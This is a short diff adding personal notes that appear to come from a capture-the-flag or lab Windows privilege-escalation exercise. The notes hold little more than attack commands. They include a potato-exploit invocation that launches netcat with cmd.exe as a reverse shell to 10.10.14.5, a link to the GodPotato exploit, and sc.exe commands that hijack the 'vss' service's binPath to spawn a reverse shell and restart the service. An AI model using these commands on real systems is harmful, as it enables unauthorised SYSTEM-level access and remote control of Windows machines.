@@ -1,0 +1,8 @@
+- chrrasco.exe -d "\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.5 5555"
+
+- https://github.com/BeichenDream/GodPotato
+
+- creat new services:
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.5 1234"
+sc.exe stop vss
+sc.exe start vss
